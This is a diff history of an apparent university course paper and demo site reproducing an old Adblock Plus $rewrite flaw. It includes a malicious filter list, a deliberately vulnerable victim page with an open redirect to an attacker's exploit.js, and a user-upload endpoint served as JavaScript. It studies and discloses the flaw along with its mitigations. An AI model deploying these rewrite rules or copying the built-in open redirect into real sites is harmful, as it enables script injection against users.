 document.getElementById("djs").innerText = "REPLACED JS";
 document.getElementById("djs").className = "warn";
 

### 2023-04-26 victim/static/static-replace.js

@@ -16,6 +16,6 @@
  *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
-document.getElementById("djs").innerText = "EXPLOITED EXPLOITED EXPLOITED";
-document.getElementById("djs").className = "fail";
+document.getElementById("sjs").innerText = "REPLACED JS";
+document.getElementById("sjs").className = "warn";
 

### 2023-04-26 victim/victim.py

@@ -33,7 +33,7 @@ csp_list = [
 	[True, "base-uri 'none';"],
 	[False, "connect-src 'self';"],
 ]
-redir_url = '/static/replace.js'
+redir_url = '/static/dynamic-replace.js'
 user_js = ''
 global_lock = Lock()
 

### 2023-04-26 paper/paper.tex
Prevent rewriting static js
Peer review

@@
 We are unable to find old version of the extension for Firefox easily.
-However, we argue that since the extension is designed to be browser-independent, the same attack should work on Firefox and Safari.
+However, we argue that since the extension is designed to be browser-independent, the same attack should work on Firefox, Safari, and Edge.
 
@@
 	\item Rewrite static Javacsript.
-		% ||*/static/static.js$rewrite=/static/replace.js
+		% ||*/static/static.js$rewrite=/static/static-replace.js
 	\item Rewrite dynamic JavaScript to static file.
-		% ||*/static/dynamic.js$rewrite=/static/replace.js
+		% ||*/static/dynamic.js$rewrite=/static/dynamic-replace.js
 	\item Rewrite dynamic JavaScript to redirect URL.
@@
 This attack works on AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019).
+We assume this attack works on the versions in between.
 This attack does not work on AdBlock Plus 3.5.2 (released in April 2019), when the rewrite feature is redesigned to prevent the attack \cite{cr4chrome_abp}.
@@
 The attack works on AdBlock 3.32.0 (released in July 2018) and 3.44.0 (released in April 2019).
+We assume this attack works on the versions in between.
 This vulnerability is fixed in AdBlock 3.46.0 (releaesd in April 2019) \cite{cr4chrome_ab}.
@@
 The main reason is that Chromium browser is popular and old versions of Chrome extensions can be easily downloaded from third party archives.
-Though we expect other browsers like Firefox and Safari to behave the same, future work is needed to verify this behavior.
+Though we expect other browsers like Firefox, Safari, and Edge to behave the same, future work is needed to verify this behavior.
 We expect compiling AdBlock Plus from source when testing on other browsers.
@@
 \appendix
-TODO: respond to peer review
+
+This section records our responds to the peer review.
+
+% Author: Eric Li
+The first comment is about the replace script changing both static JS and dynamic JS's HTML elements, which creates confusion.
+As a response, we modify the demo to only change one of static JS and dynamic JS.
+
+% Author: Eric Li
+The second comment is about Section \ref{sec:Implementation} mentioning only the start and end version of vulnerable extensions, without mentioning the versions in between.
+The peer reviewer suggests changing the sentences to ``between version X and Y.'' However, we choose to keep our writing because we want to only report what we tested.
+We add a sentence to state that the versions in between are assumed to be reproducible, though we did not test them.
+
+The third comment is about the business model in the final presentation. TODO
+
+% Author: Eric Li
+The fourth comment is about the Brave browser.
+We consider the Brave browser as out of scope.
+Through superficial research on its code base, it seems this browser implements advertisement blocking logic through Rust, which is different from AdBlock Plus.
+The advertisement blocking code does not contain the keyword ``rewrite'' in the context of the rewrite feature discussed in this paper, so we think Brave browser is not vulnerable.
+
+% Author: Eric Li
+The fifth comment is about Microsoft Edge.
+In our older draft of the paper we only mention Chrome (Chromium), Firefox, and Safari.
+We modify the paper to add Edge, since Edge is also a popular browser.
 

### 2023-04-26 paper/paper.tex
Write

@@
 
-TODO: we make our project open source?
+To help future researchers reproduce this attack, our project is open source at https://github.com/lxylxy123456/14828.
+We try to make our work reproducible, such as by providing exact versions of software we use.
 
@@
 We modify the paper to add Edge, since Edge is also a popular browser.
+We still assume the attack works on Edge with out actually testing, because as far as we know, Edge only works on Windows, but we are testing on Linux.
 

### 2023-04-30 paper/paper.tex
Update from repo

@@
 \usepackage{listings}
+% To enable subfigures
+\usepackage{caption}
+\usepackage{subcaption}
+% To prevent URL in bibliographic overflowing to second column
+\usepackage[hyphens]{url}
+
+\graphicspath{ {./images/} }
+
 \lstset{basicstyle=\ttfamily, upquote=true}
@@
 One such popular extension is Adblock Plus, which has tens of millions of users on Chrome and Firefox combined \cite{noauthor_adblockchrome_nodate, noauthor_adblockfirefox_nodate}.
-In this article, we will investigate a vulnerability introduced in a previous version of Adblock Plus that enabled the execution of arbitrary code on users' devices.
+In this article, we will investigate a vulnerability introduced in version 3.2 of Adblock Plus that enabled the execution of arbitrary code on users' devices.
 
-Adblock Plus has a very well-intended feature that allows users to apply custom filter rules.
+The power of Adblock Plus, and any other ad-blocking extension, comes from its filter lists.
+These lists are composed of a series of URLs with tracking and advertising capabilities, that when visited by the user the extension prevent from loading.
+Adblock comes with a series of filter lists installed and enabled by default, customized according to the language of the user.
+In addition, Adblock Plus has a very well-intended feature that allows users to apply custom filter rules.
 To do so, users can supply a text file that provides (a list of) rule(s) written in the syntax specified by Adblock Plus.
@@
 \begin{enumerate}
-    \item A pattern of URIs. All requests made to a URI that fits such a pattern will be filtered
+    \item A pattern of URIs. All requests made to a URI that fits such a pattern will be filtered.
     \item The action to the request that will be filtered. The most obvious and straightforward example would be blocking that request.
@@
 \begin{enumerate}
-    \item An explanation of the technology details behind the attack.
-    \item A detailed guide to re-implementing the attack, that specifies corresponding versions of the products related, and a demo website that showcases the attack.
+    \item An explanation of the technical details behind the attack.
+    \item A detailed guide to re-implementing the attack, that specifies corresponding versions of the browser and the extension necessary for the attack to succeed, and a demo website that showcases the attack.
     \item What we can learn from this vulnerability: its impacts, and what vendors can do to mitigate against it.
@@
 That is why we have chosen to investigate a vulnerability in a previous version of Adblock Plus.
+
+\subsection{Adblock Plus business model}
+According to Alphabet's financial report, in the last quarter of 2022, the company had a revenue of more than 59,000 million dollars under the category of advertising \cite{alphabet_revenue}.
+The figures that the online advertising industry manages show why there is a fierce fight between publisher of contents, ad networks and ad-blocking software.
+Eyeo GmbH business model is not exempt from this dispute.
+As part of their business model, the company charges fees to big companies to be included in an allow-list as long as the advertisement on their webpages is considered as "acceptable ads".
+This category is defined by an "acceptable Ads Committee" created by Adblock's company that counts on the presence of several stakeholders such as Amazon and Dell.
+The acceptable criteria of an ad depends on its placement on a page, its size and its being distinctive from the main content of the page \cite{acceptable_ads}.
+Although these commercial deals are not public, the Financial Times published that the fee that Adblock Plus charges to the big companies for being in the whitelist is approximately 30\% of the ad revenues archived by unblocked ads on those sites \cite{financial_times}.
+A caveat related to the links between the stakeholders of the ad industry is that since 2022, the new CEO of Eyeo GmbH is Frank Einecke, a former executive of Google for 14 years.
 
@@
 \section{Threat model}
-The threat model implies a remote attacker with the ability to abuse the rewrite filter of Adblock Plus installed in the victim's browser.
-In this scenario, the attacker may be an insider employee of Adblock Plus or an open-source malicious contributor to its codebase.
+The threat model implies a remote attacker with the ability to abuse the rewrite rule of Adblock Plus installed in the victim's browser.
+There are several possible scenarios for this to happen.
+First, Adblock Plus is an open-source tool, so a contributor may include a malicious rewrite rule to this open-source codebase being undetected.
+In addition, the extension comes with several filter rules installed by default, among those is EasyList, a series of filters written by the community.
+The EasyList file that comes preinstalled with Adblock Plus for English speakers has a total of 58,656 lines, what makes the inclusion of a malicious rule yet more feasible \cite{EasyList}.
+A second option is an insider threat inside Adblock Plus company to include the malicious rule if enough incentives are offered.
+Given the number of installations of the extension, an attacker could offer enough economic incentives in exchange of infecting millions of users.
+A variation of this scenario may happen if a developer of Adblock Plus sees his/her equipment or credentials compromised.
 In both cases, the attacker needs to include a malicious rewrite rule in the preinstalled filter lists that are enabled by default when installing the extension.
@@
 
-The victim needs to have installed a vulnerable version of Adblock Plus in the browser, with the malicious filter enabled.
+The victim user needs to have installed a vulnerable version of Adblock Plus in the browser, with the malicious filter enabled.
 For the attack to succeed the victim needs to visit the page that will be rewritten by the malicious rewrite filter.
+
+Finally, for the attack to succeed the website that the victim will be visiting needs to fetch resources and load them in the webpage while exposing an open redirect in their website.
+
 \section{Attack Outline}
-TODO
+The threat model can be schematized in an attack outline where each actor involved fulfills the following requirements.
 \begin{itemize}
-\item Victim website: Open redirect combined with fetching and loading JS code provokes worse problems.
+\item Victim website: open redirect combined with fetching and loading JS code provokes worse problems.
 \item Victim user: install malicious filter list (may be updated automatically), visit victim website.
@@
 
+\begin{figure}[htp]
+     \centering
+     \begin{subfigure}[b]{0.5\textwidth}
+         \centering
+         \includegraphics[width=.9\textwidth]{2-figure}
+         \caption{Without the malicious filter, the dynamic JavaScript is loaded on the page.}
+         \label{fig:non-vulnerable}
+     \end{subfigure}
+     \hfill
+     \begin{subfigure}[b]{0.5\textwidth}
+         \centering
+         \includegraphics[width=.9\textwidth]{1-figure}
+         \caption{With the malicious filter enabled,  AdBlock Plus rewrites the dynamic JavaScript's URL to the open redirect URL, which returns malicious JS code.}
+         \label{fig:vulnerable}
+     \end{subfigure}
+        \caption{Screenshots of a proof of concept website demonstrating the capabilities of the attack.}
+        \label{fig:poc}
+\end{figure}
+
+Figure \ref{fig:poc} shows a proof of concept website demonstrating in Figure \ref{fig:non-vulnerable} dynamic JS being loaded in a victim's page and in Figure \ref{fig:vulnerable} the same website with the injected attacker's script after the malicious filter is enabled.
+
 Removing \lstinline{script-src *} from CSP does not defend against this attack. The dynamic JavaScript is downloaded using XHR, which is not controlled by \lstinline{script-src}.
@@
 We are not able to reproduce on uBlock.
-For unknown reason uBlock does not recognize any custom filter rules we write.
+For unknown reason, uBlock does not recognize any custom filter rules we write.
 
@@
 We assume this attack works on the versions in between.
-This vulnerability is fixed in AdBlock 3.46.0 (releaesd in April 2019) \cite{cr4chrome_ab}.
+This vulnerability is fixed in AdBlock 3.46.0 (released in April 2019) \cite{cr4chrome_ab}.
 
@@
 
-TODO
+As Adblock Plus is an open-source project is possible to follow the discussion behind the \$rewrite filter implementation in their issue tracker.
+Is interesting to note that before this feature was deployed in production several voices raised concerns about the security risks it implied.
+The concerns addressed the risks of a malicious filter author and how platforms with user-uploaded content in the same origin would be endangered \cite{abp_issue_6622}.
 
-\begin{itemize}
-\item Public warnings previous the deploy of the \$rewrite feature.
-\end{itemize}
+As a response, a Software Engineer working for Adblock Plus stated that "these concerns may represent a risk, a conscious choice we make.
+One thing we could do is check \$rewrite rules in the known subscriptions (like EasyList) to keep an eye on them" \cite{abp_issue_6622}.
 
@@
 \subsection{Defense by Adblock Plus}
-
-TODO
-
-\begin{itemize}
-\item How Adblock Plus defended (limits the ability of filter rules).
-\end{itemize}
+As a mitigation to this security vulnerability, Adblock Plus included a change in its codebase to only allow rewrite redirections to internal resources.
+These resources are static and included in the source code of the extension.
+For example "\$rewrite=abp-resource:blank-js" makes a redirection to an empty JavaScript.
+Other internal resources available are an empty blank text ("abp-resource:blank-text"), a blank CSS ("abp-resource:blank-css") and a transparent gif ("abp-resource:1x1-transparent-gif"), among others.
+The \$rewrite rule is still present but with a reduced scope, achieving the goal of not only resolving the security concerns of the rewrite but also being able to prevent errors when blocking URLs \cite{abp_filter_guide}.
 
@@
 In this research, we only investigate the Chromium browser.
-The main reason is that Chromium browser is popular and old versions of Chrome extensions can be easily downloaded from third party archives.
+The main reason is that Chromium browser is popular and old versions of Chrome extensions can be easily downloaded from third-party archives.
 Though we expect other browsers like Firefox, Safari, and Edge to behave the same, future work is needed to verify this behavior.
@@
 Chrome is in the process of ending support for manifest V2, but the exact timeline is not determined as of this research \cite{chrome_manifest_v2}.
-Thus, to reproduce this demo in the future when only manifest V3 is supported, the the Chromium browser must be downgraded.
+Thus, to reproduce this demo in the future when only manifest V3 is supported, the Chromium browser must be downgraded.
 
 \section{Related Work}
-TODO
+The popularity of extensions and the security risks they impose were addressed in several academic papers \cite{carlini2012evaluation} \cite{barth2010protecting} \cite{bauer2014analyzing}.
+Carlini et al.
+\cite{carlini2012evaluation} and Barth et al.
+\cite{barth2010protecting} focus on a broad security analysis of the Chrome extension ecosystem and its architecture.
+In contrast, our research is an insight into the lifecycle of an arbitrary code execution vulnerability in a particular extension.
+Similar to our work Bauer et al.
+paper focuses on attacks of Chrome extensions while implementing proofs of poncepts on each scenario \cite{bauer2014analyzing}.
+Although their code samples that act as proof of concepts are not publicly available under a Creative Commons License.
+
 \begin{itemize}
@@
 \section*{Acknowledgment}
-TODO
+We would like to thank Hanan Hibshi for her insightful comments throughout the course of our research, and for having shown us a prolific field of study in the area of security such as browser extensions.
+This paper is a final project for the course "Browser Security" of the Master of Science in Information Technology-Information Security (MSIT-IS) and Master of Science in Information Security (MSIS) postgraduate programs at Carnegie Mellon University.
+
+We would like to dedicate a special thanks to our peers who during the course provided us with feedback to improve the project.
 
@@
 
-This section records our responds to the peer review.
+This section records our responses to the peer review.
 
@@
 
-The third comment is about the business model in the final presentation. TODO
+The third comment is about the business model of Adblock Plus and how it affects the usability of the extension from a user's perspective.
+A usability analysis was not included in our analysis as we focus on the technical security aspects of the vulnerability present in the extension.
+As a threat from inside the company was a possible scenario in the threat model, it seems pertinent to understand the business model of the company that owns Adblock.
+Nevertheless, a usability evaluation of the extension is out of the scope of the research.
 

### 2023-05-02 paper/paper.tex
Update from overleaf

@@
 \usepackage[hyphens]{url}
+
+\usepackage{dirtree}
+\usepackage{hyperref}
+
+\lstset{
+  basicstyle=\ttfamily,
+  columns=fullflexible,
+  frame=single,
+  breaklines=true,
+  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space},
+}
 
@@
 \begin{abstract}
-TODO
+The popularity of extensions that block advertisements is undeniable.
+Their omnipresence in the browsers of users around the world makes any security vulnerability in these extensions critical.
+In this article, we will investigate a vulnerability introduced in version 3.2 of Adblock Plus that enabled the execution of arbitrary code on users’ devices, their impact, and what vendors can do to mitigate against it.
+
+We choose Adblock Plus as the adblocking extension to analyze as it is one of the most popular ones with more than tens of millions of downloads on Chrome and Firefox combined.
+
+Our approach to understanding the vulnerability is, first, to study the full chain of the attack going from the \$rewrite feature implemented in the codebase of Adblock Plus, to the chain of vulnerabilities that can be leveraged by an attacker to gain arbitrary code execution.
+Based on those insights, we build a proof of concept of the attack, specifying the versions of all of the related software, and providing a skeleton website to demonstrate the attacker's capabilities.
+
+In our experimental setup we reproduce two attack scenarios.
+First, how an attacker using an open redirect on a victim website, that loads dynamic JavaScript, can abuse the AdBlock Plus \$rewrite rule to force the victim to retrieve malicious JavaScript code.
+Second, how an attacker using a feature for uploading user content present on a victim’s website, can upload a malicious JavaScript file and force the victim to retrieve it.
+
+For each of these scenarios, we address the mitigations needed to prevent the attack from happening.
+In the first case, adding connect-src 'self' to CSP defends against this attack.
+In the second case, CSP doesn’t defend against this attack so we propose as a countermeasure that the victim website cryptographically verify the dynamic JavaScript fetched from the server
+
 % This document is a model and instructions for \LaTeX.
@@
 
-Second, the attacker website needs to host the malicious JavaScript payload to be executed on the victim browser.
+The actual filter:
+
+\begin{lstlisting}
+[Adblock Plus 2.0]
+||*/static/advertisement.png
+||*/static/static.js
+||*/static/advertisement.png$rewrite=/static/welcome.png
+||*/advertisement?*^$rewrite=/advertisement
+||*/static/static.js$rewrite=/static/static-replace.js
+||*/static/dynamic.js$rewrite=/static/dynamic-replace.js
+||*/static/dynamic.js$rewrite=/redirect
+||*/static/dynamic.js$rewrite=/upload/user.js
+\end{lstlisting}
+
+Second, the attacker's website needs to host the malicious JavaScript payload to be executed on the victim's browser.
 To simplify our design, we host the JavaScript payload statically.
@@
 Similar to the attacker website, we implement the attacker website using Flask as the backend.
-The host name and port of the victim website are \lstinline{victim.local:8080}.
+The hostname and port of the victim website are \lstinline{victim.local:8080}.
 We use plain HTML and JavaScript as the frontend.
@@
 
-The victim website loads a welcome image using HTML's \lstinline{<img>} tag. This provides a image for rewriting the advertisement image later.
+The victim website loads a welcome image using HTML's \lstinline{<img>} tag. This provides an image for rewriting the advertisement image later.
 
@@
 In contrast, our research is an insight into the lifecycle of an arbitrary code execution vulnerability in a particular extension.
+
 Similar to our work Bauer et al.
@@
 
-\begin{itemize}
-\item Advertisement blocking and detection.
-\end{itemize}
+In \cite{10.1145/3433210.3437536} Zafar et al.
+conduct a thorough study of the privacy implications of Adblock Plus' allow-lists.
+Although similar to that paper, our research addresses the allow-list (and business model) present on Adblock Plus, our aim is to better explain a threat model for the particular attack addressed.
+Unlike \cite{10.1145/3433210.3437536} the focus of this paper is guided by a security question and not focused on the privacy implications of Adblock Plus.
+
+Finally, the research conducted by Alrizah et al.
+analyzed how Ad-blocking Systems rely on a crowdsourced process to build their filters.
+The aim of their paper is to analyze the pitfalls of the crowdsourcing process in terms of false positives and false negatives during the blocking of content \cite{10.1145/3355369.3355588}.
+While \cite{10.1145/3355369.3355588} is not focused on Adblock Plus security vulnerabilities, the study of how the lists are built by third parties in a crowdsourced manner, gives a complementary and useful insight to our work as we mention this fact in terms of the threat model being analyzed.
 
 \section{Conclusion}
-TODO
-
+% Author: Chengcheng Ding
+To conclude this article, we would like to give a review of the vulnerability that allowed arbitrary code execution: The vulnerability is actually composed of multiple low-priority vulnerabilities from different parties.
+A victim website needs to have open redirect or custom script hosting enabled, which is not even considered a vulnerability for most developers.
+A victim user needs to apply an Adblock Plus custom filter from another party, which is not expected to lead to an exploit as powerful as arbitrary code injection.
+Finally, Adblock Plus needs to allow the rewriting of requests to the same origin.
+To the parties involved, the corresponding vulnerabilities are most likely considered non-crucial, and will not be prioritized for patching, if patching is considered at all.
+Unfortunately, all of those little bugs added up to a very formidable exploit.
+Of course, each party here has good reasons not to prioritize patching those vulnerabilities, as we have studied in the paper.
+But we believe the major takeaway here is how little vulnerabilities, seemingly innocent on their own, can sum up to a crucial vulnerability, that could potentially affect millions of people.
 \section*{Acknowledgment}
@@
 
-\appendix
+\begin{appendices}
+
+\section{Implementation code}
+% Author: Chengcheng Ding
+
+Directory of the victim website:
+
+\dirtree{%
+.1 victim.
+.2 static.
+.3 advertisement.js.
+.3 advertisement.png.
+.3 {dynamic-replace.js}.
+.3 {dynamic.js}.
+.3 {replace.png}.
+.3 {script.js}.
+.3 {static-replace.js}.
+.3 {static.js}.
+.3 {style.css}.
+.3 welcome.png.
+.2 templates.
+.3 \hyperref[victim-index.html]{index.html}.
+.2 {victim.py}.
+}
+
+We are selectively showing some of the code for the context of this paper.
+
+\subsection{victim/templates/index.html}
+\label{victim-index.html}
+
+\begin{lstlisting}
+<!doctype html>
+
+<html>
+	<head>
+		<title>Victim</title>
+		<link rel="stylesheet" href="/static/style.css"></link>
+	</head>
+	<body>
+		<h1>Hello Victim</h1>
+		<hr />
+		<p>
+			Welcome image:
+			<img src="/static/welcome.png">
+		</p>
+		<hr />
+		<p>
+			Advertisement:
+			<span id="ajs" class="border">...</span>
+			<span id="ads_png">
+				<!-- <img src="/static/advertisement.png"> -->
+			</span>
+			<script src="/static/advertisement.js"></script>
+		</p>
+		<hr />
+		<p>
+			Targeted advertisement:
+			<span id="user_info" class="border">...</span>
+		</p>
+		<hr />
+		<p>
+			Static JS:
+			<span id="sjs" class="border">...</span>
+			<script src="/static/static.js"></script>
+		</p>
+		<hr />
+		<p>
+			Dynamic JS:
+			<span id="djs" class="border">...</span>
+			<button id="load">Load</button>
+		</p>
+		<hr />
+		<p>
+			Open <a href="/redirect">redirect</a>:
+			<input type="name" id="redir_url" value="{{ redir_url }}"
+					autocomplete="off"/>
+			<br />
+			<ul>
+				<li class="redir_prefill">/static/dynamic-replace.js</li>
+				<li class="redir_prefill">{{ ATTACKER }}/static/exploit.js</li>
+				<!-- <li class="redir_prefill">/upload/user.js</li> -->
+			</ul>
+		</p>
+		<hr />
+		<p>
+			We will host your input at
+			<a href="/upload/user.js">/upload/user.js</a>!
+			<br />
+			<input name="user" id="user" />
+		</p>
+		<hr />
+		<p>
+			CSP: <button id="csp_apply">Apply</button>
+			<br />
+			{% for enable, line in csp_list %}
+			<input type="checkbox" id="c{{ loop.index0 }}"
+				name="c{{ loop.index0 }}" autocomplete="off"
+				{%- if enable %} checked{% endif %}
+				{%- if loop.last %} class="last"{% endif %}>
+			<label for="c{{ loop.index0 }}"><tt>{{ line }}</tt></label><br>
+			{% endfor %}
+		</p>
+		<script src="/static/script.js"></script>
+	</body>
+</html>
+\end{lstlisting}
+
+Directory of the attacker website
+
+\dirtree{%
+.1 attacker.
+.2 static.
+.3 exploit.js.
+.3 script.js.
+.3 style.css.
+.2 templates.
+.3 index.html.
+.2 attacker.py.
+.2 filter-list.txt.
+}
+
+for the full implementation, please find it at our public repository \href{https://github.com/lxylxy123456/14828}{here}
+
+\section{Peer reviews we have received}
+
+\begin{enumerate}
+    \item In the demo when the dynamic javascript is rewritten, the static javascript is also rewritten.
+If possible, we think separating those scripts in the demo may gave the audience a clearer understanding.
+    \item In the "IMPLEMENTATION" section of the draft, it was mentioned that "Adblock Plus version between 3.2 and 3.5.1", yet, the "reproducibility analysis" section mentions that "This attack works on AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019)".
+We think that rephrasing the later sentence to "This attack works on version between AdBlock Plus 3.2 (released in July 2018) and 3.5.1 (released in April 2019)" might be clearer than before.
+    \item As mentioned in the first slides of the final presentation, the business model of Eyeo GmbH is an interesting model.
+We think it would be worth mentioning about how the business model affects Ablock Plus's usability from a user's perspective.
+    \item To our knowledge, the Brave Browser has its own engine for Adblock named AdBlock-rust and it supports Adblock Plus syntax.
+Is there a possibility that past version of Adblock-rust would also be vulnerable?
+    \item On the browser side, Adblock Plus does maintain a version for Microsoft Edge. Would Edge also be vulnerable for the same version of Adblock Plus?
+\end{enumerate}
+
+\section{Respond to peer review}
 
@@
 
+\end{appendices}
 \end{document}

### 2023-05-02 paper/paper.tex
Update from Overleaf

@@
 
-\usepackage{dirtree}
 \usepackage{hyperref}
@@
   postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space},
+  tabsize=4,
 }
@@
 Eyeo GmbH business model is not exempt from this dispute.
-As part of their business model, the company charges fees to big companies to be included in an allow-list as long as the advertisement on their webpages is considered as "acceptable ads".
-This category is defined by an "acceptable Ads Committee" created by Adblock's company that counts on the presence of several stakeholders such as Amazon and Dell.
+As part of their business model, the company charges fees to big companies to be included in an allow-list as long as the advertisement on their webpages is considered as ``acceptable ads''.
+This category is defined by an ``acceptable Ads Committee'' created by Adblock's company that counts on the presence of several stakeholders such as Amazon and Dell.
 The acceptable criteria of an ad depends on its placement on a page, its size and its being distinctive from the main content of the page \cite{acceptable_ads}.
@@
 % Author: Chengcheng Ding
-In version 3.2 of Adblock Plus, released on July 17, 2018, a new filter option called "rewrite" was introduced.
+In version 3.2 of Adblock Plus, released on July 17, 2018, a new filter option called ``rewrite'' was introduced.
 It allows users to rewrite outgoing requests to certain URL(s).
 In this version, the destination of requests can be rewritten to resources within the same origin.
-For example, a request to "foo.com/ad.js" can be rewritten to "foo.com/not-ad.js".
+For example, a request to ``foo.com/ad.js'' can be rewritten to ``foo.com/not-ad.js''.
 
@@
 \section{Attack Outline}
-The threat model can be schematized in an attack outline where each actor involved fulfills the following requirements.
-\begin{itemize}
-\item Victim website: open redirect combined with fetching and loading JS code provokes worse problems.
-\item Victim user: install malicious filter list (may be updated automatically), visit victim website.
-\item Attacker: control the malicious filter list.
-\item Potential impact.
-\end{itemize}
+The attack can be schematized in the fo
+
+\subsection{Victim website}
+
+has an open redirect combined with fetching and loading JS code provokes worse problems.
+
+\subsection{Victim user}
+
+install malicious filter list (may be updated automatically), visit victim website.
+
+\subsection{Attacker}
+
+control the malicious filter list.
+
+\subsection{Potential impact}
 
@@
 
+index.html:
+\begin{lstlisting}[language=HTML]
+<p>
+    Targeted advertisement:
+    <span id="user_info" class="border">...</span>
+</p>
+\end{lstlisting}
+
+script.js:
+\begin{lstlisting}
+{
+	const req = new XMLHttpRequest();
+	const url = new URL('/advertisement', document.baseURI);
+	const params = new URLSearchParams();
+	params.set('city', 'pittsburgh');
+	params.set('role', 'students');
+	params.set('company', 'CMU');
+	url.search = params.toString();
+	req.addEventListener("load", function() {
+		document.getElementById("user_info").innerText = req.responseText;
+	});
+	req.open("GET", url, true);
+	req.send();
+}
+\end{lstlisting}
+
 \subsubsection{Static JavaScript}
@@
 However, rewrite rules cannot modify the request to load another script instead.
+
+index.html:
+\begin{lstlisting}[language=HTML]
+<p>
+    Static JS:
+    <span id="sjs" class="border">...</span>
+    <script src="/static/static.js"></script>
+</p>
+\end{lstlisting}
+
+static.js:
+\begin{lstlisting}
+document.getElementById("sjs").innerText = "Static JS loaded";
+document.getElementById("sjs").className = "success";
+\end{lstlisting}
+
+static-replace.js:
+\begin{lstlisting}
+document.getElementById("sjs").innerText = "REPLACED JS";
+document.getElementById("sjs").className = "warn";
+\end{lstlisting}
 
@@
 
+index.html:
+\begin{lstlisting}[language=HTML]
+<p>
+    Dynamic JS:
+    <span id="djs" class="border">...</span>
+    <button id="load">Load</button>
+</p>
+\end{lstlisting}
+
+dynamic.js:
+\begin{lstlisting}
+document.getElementById("djs").innerText = "Dynamic JS loaded";
+document.getElementById("djs").className = "success";
+\end{lstlisting}
+
+dynamic-replace.js:
+\begin{lstlisting}
+document.getElementById("sjs").innerText = "REPLACED JS";
+document.getElementById("sjs").className = "warn";
+\end{lstlisting}
+
 \subsubsection{Open Redirect}
@@
 Example URL include a JavaScript on the victim website and a JavaScript on the attacker website.
+
+index.html:
+\begin{lstlisting}[language=HTML]
+<p>
+    Open <a href="/redirect">redirect</a>:
+    <input type="name" id="redir_url" value="{{ redir_url }}"
+            autocomplete="off"/>
+    <br />
+    <ul>
+        <li class="redir_prefill">/static/dynamic-replace.js</li>
+        <li class="redir_prefill">{{ ATTACKER }}/static/exploit.js</li>
+        <!-- <li class="redir_prefill">/upload/user.js</li> -->
+    </ul>
+</p>
+\end{lstlisting}
+
+script.js:
+\begin{lstlisting}
+function send_redir_url() {
+	const payload = new FormData();
+	payload.append("url", document.getElementById("redir_url").value);
+	const req = new XMLHttpRequest();
+	req.open("POST", "/redirect");
+	req.send(payload);
+}
+
+document.getElementById("redir_url").addEventListener("input", send_redir_url);
+
+for (let i of document.getElementsByClassName("redir_prefill")) {
+	i.addEventListener("click", function(event) {
+		document.getElementById("redir_url").value = this.innerText;
+		send_redir_url();
+	});
+}
+\end{lstlisting}
 
@@
 
+index.html:
+\begin{lstlisting}
+<p>
+    We will host your input at
+    <a href="/upload/user.js">/upload/user.js</a>!
+    <br />
+    <input name="user" id="user" />
+</p>
+\end{lstlisting}
+
+script.js:
+\begin{lstlisting}
+document.getElementById("user").addEventListener("input", function(event) {
+	const payload = new FormData();
+	payload.append("user", this.value);
+	const req = new XMLHttpRequest();
+	req.open("POST", "/upload/user.js");
+	req.send(payload);
+});
+\end{lstlisting}
+
 \subsubsection{CSP}
@@
 In an attempt to defend, the victim user can try to remove \lstinline{script-src *} from CSP and/or to add \lstinline{connect-src 'self'} to the CSP.
+
+index.html:
+\begin{lstlisting}
+<p>
+    CSP: <button id="csp_apply">Apply</button>
+    <br />
+    {% for enable, line in csp_list %}
+    <input type="checkbox" id="c{{ loop.index0 }}"
+        name="c{{ loop.index0 }}" autocomplete="off"
+        {%- if enable %} checked{% endif %}
+        {%- if loop.last %} class="last"{% endif %}>
+    <label for="c{{ loop.index0 }}"><tt>{{ line }}</tt></label><br>
+    {% endfor %}
+</p>
+\end{lstlisting}
+
+script.js
+\begin{lstlisting}
+document.getElementById("csp_apply").addEventListener("click", function(event) {
+	event.preventDefault();
+	location.reload();
+});
+
+function handle_check(event) {
+	const payload = new FormData();
+	for (let i = 0;; i++) {
+		const elem = document.getElementById("c" + i);
+		payload.append("c" + i, JSON.stringify(elem.checked));
+		if (elem.classList.contains("last")) {
+			break;
+		}
+	}
+
+	const req = new XMLHttpRequest();
+	req.open("POST", "/csp-list");
+	req.send(payload);
+}
+\end{lstlisting}
 
@@
 
-As a response, a Software Engineer working for Adblock Plus stated that "these concerns may represent a risk, a conscious choice we make.
-One thing we could do is check \$rewrite rules in the known subscriptions (like EasyList) to keep an eye on them" \cite{abp_issue_6622}.
+As a response, a Software Engineer working for Adblock Plus stated that ``these concerns may represent a risk, a conscious choice we make.
+One thing we could do is check \$rewrite rules in the known subscriptions (like EasyList) to keep an eye on them'' \cite{abp_issue_6622}.
 
@@
 These resources are static and included in the source code of the extension.
-For example "\$rewrite=abp-resource:blank-js" makes a redirection to an empty JavaScript.
-Other internal resources available are an empty blank text ("abp-resource:blank-text"), a blank CSS ("abp-resource:blank-css") and a transparent gif ("abp-resource:1x1-transparent-gif"), among others.
+For example ``\$rewrite=abp-resource:blank-js'' makes a redirection to an empty JavaScript.
+Other internal resources available are an empty blank text (``abp-resource:blank-text''), a blank CSS (``abp-resource:blank-css'') and a transparent gif (``abp-resource:1x1-transparent-gif''), among others.
 The \$rewrite rule is still present but with a reduced scope, achieving the goal of not only resolving the security concerns of the rewrite but also being able to prevent errors when blocking URLs \cite{abp_filter_guide}.
@@
 We would like to thank Hanan Hibshi for her insightful comments throughout the course of our research, and for having shown us a prolific field of study in the area of security such as browser extensions.
-This paper is a final project for the course "Browser Security" of the Master of Science in Information Technology-Information Security (MSIT-IS) and Master of Science in Information Security (MSIS) postgraduate programs at Carnegie Mellon University.
+This paper is a final project for the course ``Browser Security'' of the Master of Science in Information Technology-Information Security (MSIT-IS) and Master of Science in Information Security (MSIS) postgraduate programs at Carnegie Mellon University.
 
@@
 
-\section{Implementation code}
-% Author: Chengcheng Ding
-
-Directory of the victim website:
-
-\dirtree{%
-.1 victim.
-.2 static.
-.3 advertisement.js.
-.3 advertisement.png.
-.3 {dynamic-replace.js}.
-.3 {dynamic.js}.
-.3 {replace.png}.
-.3 {script.js}.
-.3 {static-replace.js}.
-.3 {static.js}.
-.3 {style.css}.
-.3 welcome.png.
-.2 templates.
-.3 \hyperref[victim-index.html]{index.html}.
-.2 {victim.py}.
-}
-
-We are selectively showing some of the code for the context of this paper.
-
-\subsection{victim/templates/index.html}
-\label{victim-index.html}
-
-\begin{lstlisting}
-<!doctype html>
-
-<html>
-	<head>
-		<title>Victim</title>
